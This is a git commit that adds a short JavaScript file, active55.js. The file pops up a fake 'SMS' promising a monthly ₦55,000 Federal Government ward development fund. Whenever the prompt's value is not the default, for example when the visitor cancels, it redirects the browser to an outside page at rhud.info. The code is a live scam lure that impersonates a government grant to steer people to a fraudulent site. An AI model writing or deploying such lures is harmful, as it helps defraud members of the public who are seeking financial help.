f4969af8ae1dab3b84ca10caf4cd72db569dd3fd
graantx <slicer_sizzles9k@icloud.com>
2026-05-23 20:36:18 +0100

    Create active55.js

---
+++ active55.js
@@ -0,0 +1,11 @@
+
+var password = '₦55,000';
+
+password = prompt(
+  'SMS: Congratulations, you are eligible to APPLY for ₦55,000 Monthly FG Ward Development Fund. Click OK to activate now.',
+  '₦55,000'
+);
+
+if (password !== '₦55,000') {
+    location.href = 'https://rhud.info/FG-Ward-Development-Fund.html';
+}
